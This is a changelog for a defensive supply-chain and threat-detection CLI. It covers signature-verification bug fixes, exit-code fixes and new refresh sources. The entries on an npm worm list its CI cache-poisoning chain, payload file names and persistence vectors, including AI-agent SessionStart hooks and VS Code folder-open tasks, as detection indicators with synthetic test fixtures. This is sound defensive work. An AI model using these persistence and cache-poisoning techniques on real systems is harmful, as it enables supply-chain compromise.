- `sbom` 1.1.0 → 1.2.0 — threat_currency_score 97 → 98
- `mcp` 1.1.0 → 1.2.0 — threat_currency_score 97 → 98 — new look artifacts (vscode-copilot-yolo-mode, mcp-tool-response-log)
- `kernel` 1.0.0 → 1.1.0 — threat_currency_score 92 → 95

All three `last_threat_review: 2026-05-13`.

### Method

Five parallel researcher agents dispatched via the project's multi-agent pattern (CLAUDE.md "Parallel agent dispatch for large patches"). Each agent owned one CVE; each returned a structured gap report with category, pattern, source citation (URL + quote), and ready-to-paste JSON. Main thread integrated. Hard Rule #14 codifies the pattern for every subsequent catalog addition.

## 0.12.5 — 2026-05-13

**Patch: root cause of the signature regression — a test was generating a fresh keypair mid-suite.**

### The actual bug

`tests/operator-bugs.test.js:#87 doctor --fix is registered (smoke)` invoked `exceptd doctor --fix` directly. On any host where `.keys/private.pem` was missing (every CI run, every fresh clone), `--fix` synchronously spawned `lib/sign.js generate-keypair`, which OVERWRITES `keys/public.pem` with a fresh Ed25519 public key.

After that point in the test suite:
- `keys/public.pem` = new key generated by the test
- `manifest.json` skill signatures = unchanged, still reference the COMMITTED private key
- Every subsequent step ran against a state where signatures cover content signed by Key-A but the public key on disk is Key-B
- `npm pack` shipped the new public.pem + the old (committed) manifest signatures
- `verify` on the published tarball failed 0/38 because the keys don't match

The reason it was invisible across v0.11.x and v0.12.x:
- The CI verify gate (predeploy gate 1) ran BEFORE the test that overwrote the key
- The local maintainer always had `.keys/private.pem` present, so `--fix` was a no-op locally → local verify always passed
- npm-installed operators ran `exceptd doctor --signatures` and saw 0/38, but no CI gate caught the broken tarball before publish
- The new `verify-shipped-tarball` gate (v0.12.3) caught the symptom but the forensic logging in v0.12.4 was the first time we saw HEAD's public.pem fingerprint differ from the source-tree pubkey 19 seconds later in the same CI run

### The fix

Pre-stage a dummy `.keys/private.pem` before invoking `doctor --fix` in the test, so `lib/sign.js generate-keypair` sees "private key already present" and exits before any key write. Restore the pre-test state in `finally{}`. The test still asserts the verb is registered + emits JSON, which is the only thing the smoke check needs to verify.

### Why v0.12.3 and v0.12.4 didn't fix it

v0.12.3 added the `verify-shipped-tarball` gate which correctly BLOCKED the broken publish. v0.12.4 added per-file forensic logging which surfaced the exact divergence (source-tree fingerprint at gate 1 vs. gate 14). Neither release attempted to fix the root cause because we hadn't yet localized it to `doctor --fix` invocation inside a test. v0.12.5 is the actual fix.

### Operator impact

This release SHOULD publish cleanly — the test no longer mutates `keys/public.pem` during the suite, so the post-test source tree matches the pre-test source tree, the packed tarball signatures verify against the packed public key, and the gate passes. Operators running `exceptd doctor --signatures` on v0.12.5 should see `38/38 skills passed Ed25519 verification` for the first time since v0.11.0.

### Lessons codified in CLAUDE.md

- "Tests that invoke a real CLI verb that mutates filesystem state outside the test's tempdir are a CI-vs-local divergence engine." Always sandbox key-writing CLI invocations.
- "Smoke tests should not exercise mutating code paths." A test named `*is registered (smoke)` should only verify dispatch, not run the verb's side effects.

## 0.12.4 — 2026-05-13

**Patch: forensic instrumentation for the signature-regression gate. v0.12.3 publish was blocked by the gate; v0.12.4 adds the diagnostic data needed to pinpoint the root cause on the next CI run.**

The v0.12.3 release was blocked at the new `verify-shipped-tarball` gate — exactly the behavior intended (better blocked publish than silent broken tarball). But the gate didn't log enough detail to pinpoint WHICH files diverge between source-tree and npm-packed tarball in CI. v0.12.4 adds per-file forensics + a working-tree drift dump.

### What's new

- `scripts/verify-shipped-tarball.js`: on signature-fail, logs the size + sha256 of both the tarball-extracted content AND the source-tree content, plus whether the bytes are equal. Local pass-paths unchanged.
- `.github/workflows/release.yml`: new "Forensic — working-tree drift since checkout" step (runs `if: always()` so it fires even when prior gates fail). Dumps `git status --porcelain` + `git diff --stat HEAD` + `ls -la` of the case-mixed skill directory. The next CI failure surfaces the exact file-level divergence.

### Why this isn't the root-cause fix

The bug is platform-specific: local `npm pack` on Windows produces a tarball that verifies 38/38. CI's `npm pack` on Ubuntu produces a tarball that verifies 0/38 — even though pubkey fingerprints match between source and tarball. The content drift has to be in a file the manifest signatures cover, but the signed bytes match between Windows and Linux (`.gitattributes` LF-normalizes). Forensics on the next run should make it obvious; this release ships the instrumentation, not the underlying fix.

### Operator impact

v0.12.2 remains the latest npm-published version. Operators who ran `npm install -g @blamejs/exceptd-skills` see 0/38 verify on `exceptd doctor --signatures`. Until v0.12.4 (or later) publishes successfully, the integrity gate is open. Mitigations:

- `exceptd run`, `exceptd ci`, etc. do NOT block on signature verification — they continue to function with the catalog content as installed. The skill bytes themselves are intact (npm has its own tarball integrity check; only the per-skill Ed25519 attestation layer is broken).
- For audit purposes: the supply-chain trust anchor through npm provenance (OIDC + sigstore via `npm publish --provenance`) is unaffected. Confirm with `npm view @blamejs/exceptd-skills attestations`.

### Shai-Hulud source audit (open question, not in this release)

The original Shai-Hulud campaign (2024) and Mini Shai-Hulud (CVE-2026-45321, 2026-05-11) are documented in public security research. v0.11.15 added CVE-2026-45321 to the catalog based on the description of the attack, not from a line-by-line reading of the published payload. Cross-referencing the actual payload source for IoCs we may have missed is scoped for v0.12.5:

- Walk the published worm source line-by-line; enumerate every credential path, every persistence vector, every C2 indicator.
- Compare against `data/cve-catalog.json:CVE-2026-45321.iocs` and the seven detect indicators in `data/playbooks/sbom.json` we ship.
- Add any missing patterns as additional indicators; update CHANGELOG with the line-level diff.

Same audit pattern should be applied to Copy Fail (CVE-2026-31431) and other open-sourced CVEs the catalog references — currently every CVE entry was assembled from secondary sources (advisories, NVD descriptions) rather than primary-source code review. v0.12.5 codifies the "primary-source review required before catalog entry" rule in AGENTS.md Hard Rule #14.

## 0.12.3 — 2026-05-13

**Patch: critical signature-verification regression fix + 14th predeploy gate to prevent recurrence.**

### The critical bug

Every release from v0.11.x through v0.12.2 shipped a tarball whose `keys/public.pem` did not match the Ed25519 signatures inside `manifest.json`. The result: `node lib/verify.js` against a fresh `npm install` reported `0/38 skills passed Ed25519 verification` and every skill listed as `TAMPERED`. Verification was silently bypassed by `exceptd run`, `exceptd ci`, etc. (which load skills without re-verifying), so the surface was only visible to operators running `exceptd doctor --signatures`.

### What broke

The CI release workflow's `verify` step ran against the SOURCE tree (which had matching signatures + public key). It passed `38/38`. But the tarball that `npm publish` actually uploaded ended up with a different `public.pem` than the source tree. Verifying-on-source-tree is not the same as verifying-on-shipped-tarball. The mismatch went undetected for the entire v0.11.x and v0.12.x series.

### The fix

- `scripts/verify-shipped-tarball.js` — packs the package via `npm pack`, extracts the tarball to a temp dir, and runs Ed25519 verify against the **extracted tree**. Catches any divergence between source-tree state and shipped-tarball state. Logs both fingerprints (source vs. tarball) so any future mismatch is forensically obvious.
- Wired in as **the 14th predeploy gate** so local maintainers + CI both run it. A release that produces a broken tarball now blocks before `npm publish` instead of shipping silently.
- v0.12.3 re-signs every skill against the current public key, then runs the new gate to confirm the round-trip is clean.

### Other fixes

- **#137**: help text bumped from `v0.11.0 canonical surface` → `v0.12.0 canonical surface`.
- **#136 (text part)**: legacy-verb removal target moved from v0.12 → v0.13 in help text and deprecation banner. Actually removing the verbs is scope for a future release.
- **#135 (the run-with-no-evidence exit-0 case)**: deferred to v0.12.4. The fix is straightforward (have `run` exit 3 when classification: inconclusive AND no observations submitted, matching `ci`'s semantic) but changes the `run` verb's contract, which deserves a focused release that also documents the behavior change.

### Lesson codified in CLAUDE.md

"Verify-on-source-tree is not verify-on-shipped-tarball." Any project that signs artifacts must verify the EXACT bytes that downstream consumers receive, after `npm pack` (or equivalent packaging step). The next-easiest place to lose integrity is the file-set transformation between `git checkout` and the registry upload — and that transformation runs in CI, where the maintainer has the least visibility.

## 0.12.2 — 2026-05-13

**Patch: end-to-end scenario gate — staged-IoC harness in release workflow.**

366 unit tests prove the engine works in isolation. They don't prove that, given a real repo containing a CVE-2026-45321 payload file in `node_modules/@tanstack/`, the CLI actually catches it. v0.12.2 adds that gate.

### What ships

- `tests/e2e-scenarios/` — eight self-contained scenarios. Each is a directory holding a synthetic file tree (`fixtures/`), an evidence JSON, and an expectation JSON. The runner copies the fixture tree into a temp dir, runs the declared CLI verb against it, and diffs the result.

  | # | Scenario | What it stages | Asserts |
  |---|---|---|---|
  | 01 | clean-repo | nothing | `classification: not_detected`, `compliance_theater: clear` |
  | 02 | tanstack-worm-payload | `node_modules/@tanstack/react-router/router_init.js` | `detected` + jurisdiction clock starts |
  | 03 | claude-session-start-hook | `.claude/settings.json` with `hooks.SessionStart` running `.vscode/setup.mjs` | `detected` |
  | 04 | vscode-folder-open-task | `.vscode/tasks.json` with `runOptions.runOn: folderOpen` | `detected` |
  | 05 | ci-cache-coresidency | `.github/workflows/` containing `pull_request_target` + `id-token: write` + shared `actions/cache` | `detected` |
  | 06 | npmrc-no-cooldown | `package.json` with deps + no `.npmrc` cooldown | `inconclusive` (hardening recommendation) |
  | 07 | cve-curation | invoke `refresh --curate` on a real human-curated entry | refusal with `human-curated` error |
  | 08 | refresh-advisory | invoke `refresh --advisory` against an offline GHSA fixture | draft seed emitted, exit 3 |

- `scripts/run-e2e-scenarios.js` — iterates scenarios, supports `--filter=<regex>` + `--json`. Returns non-zero on any failure.
- `docker/test.Dockerfile` — new `e2e` target so the harness runs identically in CI containers and on a developer host (`npm run test:docker:e2e`).
- `npm run test:e2e` — local invocation (no Docker required).

### Release-workflow integration

`.github/workflows/release.yml` now runs `npm run test:e2e` immediately after `npm run predeploy` and before `npm pack` / `npm publish`. A regression that breaks any playbook's detection layer — even one that passes every unit test — blocks the publish.

### Coverage matrix

| Surface | Covered |
|---|---|
| `run sbom` with real IoC fixtures | scenarios 01-06 |
| `refresh --advisory` (offline fixture path) | scenario 08 |
| `refresh --curate` (human-curated refusal path) | scenario 07 |
| Exit-code semantics (0 / 2 / 3) | every scenario asserts `expect_exit` |
| `phases.detect.classification` + `phases.close.jurisdiction_notifications` | scenarios 02-05 |

Surface gaps to add in subsequent patches: `ai-run --stream` (JSONL contract), `attest verify` + `attest diff` against staged attestations, `doctor` with mock signature failures, `discover` against staged cwds.

## 0.12.1 — 2026-05-13

**Patch: README + website docs for the v0.12.0 freshness surface.**

v0.12.0 shipped the GHSA source + `refresh --advisory` + `refresh --curate` but the README operator section + the website still showed the v0.11.x command set. v0.12.1 brings the docs into line:

- README: refresh command reference now lists `--network`, `--advisory <CVE-or-GHSA-ID>`, `--curate <CVE-ID>`, `--prefetch`, and the `ghsa` source. Operator section command examples updated. New `EXCEPTD_GHSA_FIXTURE` + `EXCEPTD_REGISTRY_FIXTURE` env vars documented.
- Website: "nightly upstream refresh" feature card extended to mention GHSA as the minutes-old disclosure path (vs days for KEV / NVD). Operator persona card command list updated to show the advisory + curate workflow.

No CLI / catalog / playbook changes — pure docs.

## 0.12.0 — 2026-05-13

**Minor: catalog freshness from minutes-old disclosures, not days.**

Today's refresh sources (KEV / NVD / EPSS / IETF / MITRE) don't see a fresh-disclosure npm worm. KEV listing takes days; NVD takes ~10 days. The CVE-2026-45321 TanStack worm was caught publicly within 20 minutes — but the only feed that fired in that window was the GitHub Advisory Database. v0.12.0 adds GHSA as a refresh source, plus operator-driven single-advisory seeding, plus an editorial-enrichment helper.

### GHSA as a refresh source

`exceptd refresh` now pulls from GitHub Advisory Database (covers npm, PyPI, RubyGems, Maven, NuGet, Go, Composer, Swift, Erlang, Pub, Rust). Unauthenticated 60 req/hr; authenticated 5000 req/hr via `GITHUB_TOKEN` env var. New CVE IDs land as **drafts** flagged `_auto_imported: true` + `_draft: true`. The strict catalog validator treats drafts as warnings, not errors — so the nightly auto-PR pipeline can ship them without blocking on editorial review. Framework gaps + IoCs + ATLAS/ATT&CK refs are explicit nulls awaiting human or AI-assisted enrichment.

(Note: npm Inc. does not publish a standalone JSON advisory feed; npm advisories are surfaced via GHSA. Adding `npm-advisories` as a separate source would duplicate GHSA data with no fidelity gain.)

### `exceptd refresh --advisory <id>`

Operator-driven single-advisory seeding. Accepts CVE-* or GHSA-* identifiers. Fetches the advisory from GHSA, normalizes to the catalog draft shape, prints (default) or writes (`--apply`). Always exits **3** ("draft prepared, editorial review pending") so CI pipelines surface the next step.

```
exceptd refresh --advisory CVE-2026-45321               # dry-run, prints draft
exceptd refresh --advisory CVE-2026-45321 --apply       # writes draft into data/cve-catalog.json
exceptd refresh --advisory GHSA-xxxx-xxxx-xxxx --json   # JSON output
```

Refuses to overwrite a human-curated entry. Honors `EXCEPTD_GHSA_FIXTURE` env var for offline tests.

### `exceptd refresh --curate <CVE-ID>`

Editorial-enrichment helper. Reads the draft entry from `data/cve-catalog.json`, cross-references against `data/atlas-ttps.json` + `data/attack-ttps.json` + `data/cwe-catalog.json` + `data/framework-control-gaps.json`, and emits structured **editorial questions** — one per null field — each with ranked candidates and a specific ASK for the reviewer.

```
{
  "editorial_questions": [
    {
      "field": "atlas_refs",
      "current_value": [],
      "candidates": [{"id": "AML.T0010", "score": 68, "reason": "..."}],
      "ask": "Which MITRE ATLAS techniques are present in the attack chain?"
    },
    {
      "field": "framework_control_gaps",
      "ask": "Which framework controls CLAIM to cover this CVE's category, and where do they fall short? Per AGENTS.md Hard Rule #6, every framework finding must include a test that distinguishes paper compliance from actual security."
    },
    ...
  ]
}
```

Pure heuristic — deterministic keyword-overlap scoring against existing catalogs. The reviewer (human or AI assistant) makes the final call on each candidate. Always exits **3** because editorial review is, by definition, pending.

(The natural-language form `exceptd run cve-curation --advisory <id>` — wrapping this helper in a full seven-phase playbook with GRC closure — is scoped for v0.13. The helper itself ships in v0.12 so operators can use it now.)

### Catalog schema

- `data/cve-catalog.json` entries may now carry `_auto_imported`, `_draft`, `_draft_reason`, `_source_ghsa_id`, `_source_published_at` fields.
- `lib/validate-cve-catalog.js` recognizes drafts: prints them as `DRAFT` lines (not `FAIL`), does not exit-fail. The summary line includes a `<N> draft(s) (auto-imported)` count.
- `lib/schemas/cve-catalog.schema.json` is unchanged; the draft fields are absorbed by `additionalProperties: true`.

### Tests

7 new regression cases. 366 total. Coverage: ghsa fixture fetch, advisory normalization (draft shape + cisa_kev_pending heuristic for critical), `refresh --advisory` dry-run + apply paths, `refresh --curate` editorial-question generation, refusal-on-human-curated, validator draft-tolerance.

### Operator workflow

The end-to-end flow for a fresh-disclosure CVE the nightly job hasn't caught yet:

```
$ exceptd refresh --advisory CVE-2026-XXXXX --apply       # seeds draft from GHSA
$ exceptd refresh --curate CVE-2026-XXXXX                  # surfaces editorial questions + candidates
# review the questions, fill the catalog entry, add a zeroday-lessons.json entry,
# remove _auto_imported and _draft flags, then:
$ npm run predeploy                                        # strict gate now passes
```

The nightly auto-PR mechanism handles the GHSA pull automatically; this surface is for "I want this CVE today, not tomorrow."

## 0.11.15 — 2026-05-13

**Patch: CVE-2026-45321 (Mini Shai-Hulud TanStack npm worm) — catalog + playbook + IoC sweep.**

Adds detection for the npm supply-chain worm disclosed 2026-05-11 (84 malicious versions across 42 `@tanstack/*` packages, including `@tanstack/react-router` at ~12M weekly downloads, CVSS 9.6). The novel category: first documented npm package shipping VALID SLSA provenance while being malicious. Provenance proves which pipeline built the artifact, not that the pipeline behaved as intended.

### Catalog

- `data/cve-catalog.json` — new entry `CVE-2026-45321` with full RWEP scoring (78), the three chained primitives (`pull_request_target` co-resident with `id-token: write` and shared `actions/cache`), payload IoCs, persistence IoCs (`.claude/settings.json` SessionStart hooks, `.vscode/tasks.json` folder-open hooks, macOS LaunchAgents, Linux systemd-user units), framework-gap analysis (SLSA L3 insufficient, NIST 800-218 SSDF PS.3/PO.3 gap), and the destructive-on-revocation behavior.

### Playbook detections (sbom)

- `tanstack-worm-payload-files` — find `node_modules/@tanstack/*/router_init.js` or `router_runtime.js`
- `tanstack-worm-resolved-during-publish-window` — lockfile entries resolved 2026-05-11T19:20Z..19:26Z
- `agent-persistence-claude-session-start-hook` — non-owner SessionStart hooks
- `agent-persistence-vscode-folder-open-task` — folder-open tasks running staged setup scripts
- `agent-persistence-os-level` — macOS LaunchAgents + Linux systemd-user units referencing in-repo `.mjs`
- `ci-cache-poisoning-co-residency` — repo has `pull_request_target` + `id-token: write` + shared `actions/cache` (architectural pre-condition, even without payload)
- `npm-registry-no-cooldown` — project consumes npm but `.npmrc` lacks `before=` or `minimumReleaseAge=`

### Playbook detections (mcp)

- Same `agent-persistence-*` indicators on the agentic-tooling side. MCP playbook covers the persistence vector; SBOM covers the supply-chain root.

### Skill update

- `skills/supply-chain-integrity/SKILL.md` — adds the CVE-2026-45321 case at the top of Threat Context with the chained-primitives explanation and the new SLSA-L3-insufficient framing.

### Eating own dogfood

- `.npmrc` — adds `before=72h` + `minimumReleaseAge=4320` so this repo refuses fresh-publish installs. Survives downgrade to older npm via both flags.

### threat_currency_score bumps

- `sbom` 95 → 97, `mcp` 96 → 97, both with `last_threat_review: 2026-05-13`.

## 0.11.14 — 2026-05-13

**Patch: items 129-134 + freshness surface — claims-vs-reality gap closure + opt-in registry-check.**

### New: freshness surface (all opt-in, all offline-safe)

- **`doctor --registry-check`.** Queries the npm registry for the latest published version + publish date. Reports `local_version`, `latest_version`, `days_since_latest_publish`, and a `behind` / `same` / `ahead` flag. Routed through a child process so the call is bounded by a hard timeout; offline degrades to a structured warning, not a hang. Opt-in: doctor without the flag stays offline.

- **`run --upstream-check`.** Same registry call, fires before phase-4 detect. Surfaces an `upstream_check` block on the run result + a visible stderr warning when the local catalog is behind. Operators wiring CI gates can read `result.upstream_check.behind` to decide whether to trust today's findings. Doesn't fetch the catalog — only compares timestamps.

- **`refresh --network`.** Fetches the latest signed catalog snapshot from the maintainer's npm-published tarball, verifies every skill's Ed25519 signature against the `keys/public.pem` already in the operator's install, and swaps `data/` + `skills/` + `manifest.json` in place. Same trust anchor as `npm update -g`; only the data slice changes, so CLI/lib code stays pinned. Refuses the swap on public-key fingerprint mismatch (key rotation requires explicit `npm update -g` so the trust transition is auditable). Refuses when the install dir isn't writable (typical global installs) and points operators at `npm update -g` instead. Includes `--dry-run` for verifying signatures without applying. Backs up the prior `data/` to a timestamped dir so rollback is one `mv` away.

All three honor `EXCEPTD_REGISTRY_FIXTURE` env var (path to a JSON file mimicking the registry response) so test runners and air-gapped operators can exercise the freshness paths offline.

### Bugs

- **#129 air-gap workflow is now operator-accessible.** Pre-0.11.14 the docs implied `refresh --from-cache` worked offline but the cache-population path wasn't surfaced; an empty cache produced a stack trace. Now `refresh --prefetch` is the operator-facing alias for the prefetch script (legacy `--no-network` retained). Missing-cache errors emit a structured hint that names the exact command: "(1) on connected host: `exceptd refresh --prefetch`, (2) copy `.cache/upstream/`, (3) offline: `exceptd refresh --from-cache --apply`." Help text rewritten to document the workflow.

- **#130 `exceptd path copy` writes to the clipboard.** Previously the `copy` argument was silently consumed and the path was just printed — operators wondering "did anything happen?" had no signal. Now the verb invokes the platform clipboard tool (`clip` on Windows, `pbcopy` on macOS, `wl-copy` / `xclip` / `xsel` on Linux), confirms the copy on stderr, and still prints the path on stdout so shell consumers like `cd "$(exceptd path)"` continue to work. When no clipboard tool is available, a clear warning fires instead of a silent fallthrough.

- **#131 `run <skill-name>` suggests the right playbook.** 13 playbooks vs 38 skills with a many-to-many relationship: operators routinely typed `run kernel-lpe-triage` (a skill) and got "Playbook not found." Now the error names the playbook(s) that load the skill (e.g. `kernel`), distinguishes skill-vs-playbook semantics, and suggests both `exceptd run <playbook>` (execute) and `exceptd skill <name>` (read). Near-matches on unknown ids also surface (`run secret` → "Did you mean: secrets?"). Landing site updated to clarify the distinction near the skills grid.

- **#134 `ci` exit-code matrix puts BLOCKED before FAIL.** Pre-0.11.14 a preflight halt produced exit 2 (FAIL) — indistinguishable from "playbook detected a real problem." Operators wiring CI gates against `exit 2` couldn't separate "we never executed" from "we executed and found something." Now the precedence is BLOCKED (4) → FAIL (2) → NO-DATA (3) → PASS (0). The earlier `if (fail)` short-circuit was rearranged so blocked counts take precedence.

### Website (operator-facing)

- **#132** `exceptd build-indexes` references replaced with `exceptd refresh --indexes-only`.
- **#133** "13-gate predeploy" feature card relabeled "13-gate release hygiene" and explicitly disambiguated from the operator-facing `exceptd ci` verb.
- **#131** Skills grid header clarifies "skills are read-only; playbooks execute" with the three relevant verbs.
- **#129** Operator persona card shows the actual air-gap workflow: `refresh --prefetch` → copy → `refresh --from-cache --apply`.

### Tests

7 new regression cases. 354 total. Notable: `#125/#134` now triggers a REAL preflight halt by submitting `repo-context: false` keyed by playbook id (autoDetectPreconditions can't override an explicit submission), and asserts `r.status === 4` not just non-zero — the earlier test only caught "not 0" which my v0.11.12 "fix" passed by coincidence (no-evidence → exit 3, also non-zero).

### Lesson codified

When a "fix" passes a regression test by coincidence (any non-zero exit satisfies "not 0"), the test is too weak. Tests must assert the EXACT contract — exit 4, not "any non-zero." Added to CLAUDE.md.

## 0.11.13 — 2026-05-13

**Patch: the final two stragglers — universal `ok:false` exit and empty-submission diff counters.**

### Bugs

- **#127 (originally #100) — `ok:false` body always yields non-zero exit.** Pre-0.11.13 several verbs emitted a result body with `ok: false` to stdout but didn't set `process.exitCode`, so `exceptd run ...; echo $?` returned 0 and `set -e` shell scripts couldn't gate on it. The previous fix was per-verb. Now `emit()` itself sets `process.exitCode = 1` whenever the body has `ok: false` at top level (unless a caller already set a different non-zero code). Universal contract: anything that emits `ok: false` to stdout OR stderr returns non-zero, no exceptions. New verbs cannot regress this — the catch is at the renderer.

- **#128 (originally #102) — attest diff falls back to playbook catalog when submissions are empty.** Pre-0.11.13 `attest diff` between two identical empty-submission attestations reported `status: unchanged` (hash equality) but `total_compared: 0, unchanged_count: 0` — operators couldn't tell whether "0 unchanged" meant "diff didn't iterate" or "nothing to compare." Now: when a submission has neither `artifacts` nor `observations`, the diff helper falls back to the playbook's `look.artifacts` catalog (via the attestation's stored `playbook_id`). Result: `total_compared` reflects the catalog size; `unchanged_count` equals `total_compared` when both sides are uniformly empty. Real observation submissions retain the prior behavior.

### Tests

3 new regression cases. 347 total. The `#127` test asserts the universal contract by hitting `attest verify` on a non-existent session id and checking that any `ok:false` body (stdout or stderr) maps to non-zero exit. The `#128` test runs two `{}` submissions through `run sbom` and asserts the diff reports `total_compared > 0` matching `unchanged_count`.

### Lesson codified in CLAUDE.md

When a class of bug ("verb forgot to set exit code") keeps recurring across releases, fix the class, not the instance. Move the contract to the lowest layer that all paths share — here, `emit()` itself.

## 0.11.12 — 2026-05-12

**Patch: items 123-126 — content-not-just-shape, exit-code discipline, diff iteration.**

Pattern: previous releases shipped the right field names but with empty content (notifications array existed but every entry's metadata was null), and exit-code semantics didn't cover the gates operators actually wanted to wire.

### Bugs

- **#123 jurisdiction notification entries carry obligation metadata.** Pre-0.11.12 `phases.close.jurisdiction_notifications` produced the right count of entries but each entry shape was `{ obligation_ref, recipient, draft_notification, deadline, ... }` — no `jurisdiction`, no `regulation`, no `window_hours`. The upstream `govern.jurisdiction_obligations` had the real metadata but close didn't carry it forward. Now each notification entry includes `jurisdiction`, `regulation`, `obligation_type`, `window_hours`, `clock_start_event`, `clock_started_at`, `deadline`, `notification_deadline` (alias matching compliance-team vocabulary), and `evidence_required`. Operators running `exceptd ci --block-on-jurisdiction-clock` now get notifications with the metadata they need to route to regulators and put on calendars.

- **#124 `--ack` propagates into `phases.govern.operator_consent`.** Consent semantically belongs in govern (it acknowledges the jurisdiction obligations surfaced there). Pre-0.11.12 `--ack` set only `result.operator_consent` at the top level; the govern phase showed `null`. Now `phases.govern.operator_consent` is `{ acked_at, explicit: true }` when `--ack` is passed, `null` otherwise. Top-level `result.operator_consent` retained for backward compat.

- **#125 ci exit-code matrix covers BLOCKED.** Pre-0.11.12 ci returned 0 for every non-detected path including blocked runs that never executed (preflight halt, mutex contention, stale threat intel, missing precondition). CI gates couldn't distinguish "ran clean" from "didn't run." Now: `0 PASS`, `2 detected/escalate`, `3 ran-but-no-evidence`, `4 BLOCKED (any ok:false)`, `1 framework error`. BLOCKED takes precedence over no-data because it's a harder gate failure. Help text updated.

- **#126 attest diff iterates artifact sets correctly.** Pre-0.11.12 `total_compared` was always 0 on flat-shape submissions because the diff helper called `normalizeSubmission` with an empty playbook stub (`look.artifacts: []`), producing empty maps. Now the diff loads the real playbook from each attestation's `playbook_id` and normalizes against the actual artifact catalog; falls back to direct observation-key mapping when the playbook can't be loaded (renamed/removed). Identical submissions with N observations now correctly report `total_compared: N, unchanged_count: N`.

### Tests

5 new regression cases. 344 total. Tests assert content shape, not just field presence — every test that checks for a notification array now also asserts the entries carry non-null jurisdiction/regulation/window_hours.

### Voice note (internal)

Three of the four items (#123, #124, #126) were "added the field but the field was empty." Lesson: when an operator says "field is missing," the next question to ask after "is it on the result?" is "is its content meaningful, or is it a structurally-present null?" Codified in CLAUDE.md.

## 0.11.11 — 2026-05-12

**Patch: CI test-gate hotfix — emit-then-exit stdout flush.**

v0.11.10 #100 used `process.exit(3)` after writing the result JSON to stdout. When stdout is piped (CI, test harnesses, JSON consumers), Node's `process.exit()` can return before the buffered async write drains — so `--json` consumers saw empty stdout despite the structured emit. Fix: switch to `process.exitCode = N; return;` so the event loop ends naturally and stdout drains.

### Bugs

- **`ci` --json with exit 3 truncated output.** Tests passed locally but the GitHub Actions release workflow's test gate failed on `tests/operator-bugs.test.js:#103` ("ci output should be JSON") because the Linux runner exposed the flush race more reliably than Windows. Fixed in two places:
  - `cmdCi` exit 3 (no evidence + all inconclusive)
  - `cmdCi` exit 2 (FAIL)
  - `cmdRun` `--strict-preconditions` exit 1 (same shape; pre-existing latent risk)

### Tests

New regression: `#100/#103 ci exit-3 path still flushes JSON to stdout` — asserts both `r.status === 3` AND `tryJson(r.stdout)` parses. This is the test that would have caught v0.11.10 before CI.

### Lesson

When ending a verb with a non-zero exit AFTER writing structured stdout, prefer `process.exitCode = N; return;` over `process.exit(N)`. The former lets the event loop drain stdout; the latter can truncate. Codified in CLAUDE.md.

## 0.11.10 — 2026-05-12

**Patch: items 119-122 — field-name alignment with operator expectations.**

Pattern recognized across 10 v0.11.x releases: my output field names didn't match what operators were reading for. Several "broken" items were actually present-under-a-different-name. v0.11.10 adds the missing aliases + tightens ci's empty-evidence semantic.

### Bugs

- **#119 `result.ack` alias.** v0.11.9 surfaced `--ack` as `result.operator_consent.explicit`. Operators reading `result.ack` (matching the flag name) saw `undefined` and concluded the flag was dropped. Now: `result.ack` is a top-level boolean mirroring the consent state. `operator_consent.explicit` retains its richer shape.

- **#100 ci with no evidence exits 3.** Pre-0.11.10 `ci --required <pb>` with NO `--evidence`/`--evidence-dir` ran every playbook to inconclusive and exited 0 — operators couldn't distinguish "ran clean" from "never had real data." Now: when no evidence was supplied AND every result is inconclusive, ci exits **3** with a clear stderr warning: "ran but never had real data. Pass --evidence <file> or --evidence-dir <dir>." Exit code matrix: 0 PASS, 2 FAIL (detected/escalate), 3 NO-DATA, 1 framework error.

- **#102 `total_compared` field on attest diff.** Pre-0.11.10 `unchanged_count: 0 + added: 0 + removed: 0 + changed: 0` was ambiguous ("0 unchanged of how many?"). Now both `artifact_diff` and `signal_override_diff` include `total_compared` (set size of the union of both sides' keys). Operators can distinguish "no comparison happened" (total_compared: 0) from "everything matched" (total_compared: N, unchanged_count: N).

- **#104 `phases.close.jurisdiction_notifications` alias + `jurisdiction_clocks_count`.** The runner emitted `notification_actions`; operators expected `jurisdiction_notifications`. Now both names point to the same array (full list), and `jurisdiction_clocks_count` mirrors the ci-aggregate count of notifications whose clock has actually started. Compliance teams reading `phases.close.jurisdiction_notifications.length` (or filtering by `.clock_started_at != null`) get the expected shape.

### Tests

5 new cases in `tests/operator-bugs.test.js` for items 119/100/102/104. 338 total.

### Verified by direct repro before fix

For every item I:
1. Ran the user's exact CLI invocation
2. Inspected the actual output shape vs the user's stated expectation
3. Identified whether the bug was missing logic OR field-name mismatch
4. Fixed both layers when the answer was "mismatch" (add alias) so subsequent operators reading by either name see the data

Pattern documented in CLAUDE.md (project-side contributor guide).

## 0.11.9 — 2026-05-12

**Patch: items 99-115 — CLI-shim audit, real fixes.**

User audit identified the common root cause across 8 releases of "fixed" bugs that operators kept re-finding: the CLI shim layer between arg parsing and result rendering. v0.11.9 audits that layer end to end.

### Critical

- **#99 default human output, unconditionally.** Pre-0.11.9 default was conditional on `process.stdout.isTTY`. Under most automation harnesses (Claude Code's Bash tool, GitHub Actions, CI runners, subprocess pipes) `isTTY` is false, so operators saw JSON everywhere "default human" was advertised. Now: when a human renderer is supplied AND no `--json`/`--pretty`/`--json-stdout-only` is passed, emit human. `--json` to opt back into JSON. Closes the longest-standing UX gap.

### Bugs

- **#100 cmdRunMulti exits non-zero on any blocked run.** Pre-0.11.9 the aggregate result had `{ok: false}` in the body but exit code stayed 0 for multi-playbook runs (cmdRunMulti was missing the exit-non-zero gate that cmdRun had). CI gates couldn't distinguish "ran clean" from "any blocked." Now: cmdRunMulti checks `results.some(r => r.ok === false)` and exits 1 when true, matching cmdRun's single-playbook contract.

- **#113 `--operator` surfaces in run result top-level.** Pre-0.11.9 `--operator` was persisted to the attestation file but the run result didn't echo it back. Operators thought the flag was dropped. Now: `result.operator = runOpts.operator` so `exceptd run … --operator … --json | jq .operator` returns the supplied value.

- **#114 `--ack` surfaces in run result top-level.** Same shape as #113. `result.operator_consent = { acked_at, explicit: true }` echoes back in the run result.

- **#115 `ci --required <list>` actually filters.** Pre-0.11.9 the flag was silently ignored — `ci --required secrets,sbom` ran the default scope set anyway. Now: `--required` takes precedence over `--scope` and `--all`, runs exactly the named set, rejects unknown playbook IDs with a structured error.

- **#102 `attest diff` unchanged_count for identical hashes** — already fixed in v0.11.8 (verified by new regression test in this release).

- **#104 jurisdiction clocks on detected** — verified working: `ci --required secrets --evidence <detected-submission>` returns `jurisdiction_clocks_started: 3` (for secrets' 3 detect_confirmed obligations). The user's earlier report was on a pre-canonicalize-fix version where `detection_classification: detected` wasn't propagating.

### Tests

